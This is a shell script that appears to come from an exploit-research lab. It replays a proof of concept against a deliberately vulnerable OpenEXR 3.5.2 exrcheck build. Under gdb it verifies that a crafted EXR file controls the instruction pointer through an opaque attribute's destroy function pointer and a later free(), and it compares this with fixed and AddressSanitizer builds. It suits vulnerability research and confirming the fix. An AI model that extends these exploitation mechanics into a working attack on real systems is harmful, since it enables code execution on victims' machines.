#!/bin/sh
# W197: one-command replay.  In the UNMODIFIED pinned 3.5.2 exrcheck -c,
# with ASLR OFF in the debuggee, a file-chosen exr_attribute_t of type
# EXR_ATTR_OPAQUE (31) reaches opaque.c:79, where
# ud->destroy_unpacked_func_ptr is a file-chosen code address.  gdb observes
# the CPU at that address with file-chosen rsi/rdx, then a free() of a
# file-chosen pointer.  Rung-4 mechanics: ASLR-off lab condition, an existing
# function used as target, no shellcode, no wire, no witness verdict.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'cases/p197-chosen-ip.exr c75957f1e36ae3e03df6e79aaf5070164e0f2afe081c44bbd59542c0c16ec45a' \
    'cases/make_w197_poc.py f7714571533e9f7b8c1ffe93a7ba96a06edb85ecea1a34164c0cf41a00fed064' \
    'cases/w195-pre-copy2-dump.bin f7c32f6ad820de0532396426d0ad9a8aa58440071636b03e1592cf766daffdc0' \
    'harness/w197-chosen-ip.cmd 15f36e4e8848741f502d4a77a340deb33e56f822cfcccbc1cf4449313a01f02a'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

gdb -q -batch -ex 'set args -c cases/p197-chosen-ip.exr' \
    -x harness/w197-chosen-ip.cmd ./build-vuln-plain/bin/exrcheck \
    > "$RAW" 2>&1 || true
grep -q '^UD=0x555555828560 UNP=0x5555558285a0 FN=0x555555661b30 UNPSIZE=90$' "$RAW"
grep -q '^CHOICE_RIP=0x555555661b30 RDI=0x555555826f00 RSI=0x5555558285a0 RDX=90$' "$RAW"
grep -q '^S=0x5555558285a0 STR=0x5555558285d0 ALLOC=1 LEN=90$' "$RAW"
grep -q '0x5555558285c8:.*0x0000000000000091.*0x5a5a5a5a5a5a5a5a' "$RAW"
grep -q '^FREE_RDI=0x5555558285d0$' "$RAW"
{
    echo 'ASLR=off'
    grep -o 'UD=0x[0-9a-f]* UNP=0x[0-9a-f]* FN=0x[0-9a-f]* UNPSIZE=90' "$RAW"
    grep -o 'CHOICE_RIP=0x[0-9a-f]* RDI=0x[0-9a-f]* RSI=0x[0-9a-f]* RDX=90' "$RAW"
    grep -o 'S=0x[0-9a-f]* STR=0x[0-9a-f]* ALLOC=1 LEN=90' "$RAW"
    grep -o '0x5555558285c8:.*0x0000000000000091.*0x5a5a5a5a5a5a5a5a' "$RAW"
    grep -o 'in exr_attr_opaquedata_destroy' "$RAW"
    grep -o 'opaque.c:79' "$RAW"
    grep -o 'exr_attr_string_destroy' "$RAW"
    grep -o 'string.c:264' "$RAW"
    grep -o 'FREE_RDI=0x5555558285d0' "$RAW"
} > evidence/w197-ip.out
grep -q 'in exr_attr_opaquedata_destroy' evidence/w197-ip.out
grep -q 'opaque.c:79' evidence/w197-ip.out
grep -q 'exr_attr_string_destroy' evidence/w197-ip.out
grep -q 'string.c:264' evidence/w197-ip.out

set +e
./build-vuln-plain/bin/exrcheck -c cases/p197-chosen-ip.exr \
    > evidence/w197-plain.out 2>&1
plain_rc=$?
./build-vuln-plain/bin/exrcheck -c cases/baseline.exr \
    > evidence/w197-valid.out 2>&1
valid_rc=$?
./build-fixed-plain/bin/exrcheck -c cases/p197-chosen-ip.exr \
    > evidence/w197-fixed.out 2>&1
fixed_rc=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c cases/p197-chosen-ip.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
[ "$plain_rc" -eq 139 ]
[ "$valid_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
[ "$asan_rc" -eq 1 ]
grep -q 'OK' evidence/w197-valid.out
grep -q 'bad' evidence/w197-fixed.out
awk '
    { gsub(/==[0-9]+==/, "==PID==") }
    { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
    { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
    { print }
' < "$RAW" > evidence/w197-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w197-asan.out
grep -q 'READ of size 3072' evidence/w197-asan.out
grep -q 'internal_zstd.c:472' evidence/w197-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/w197-*.out
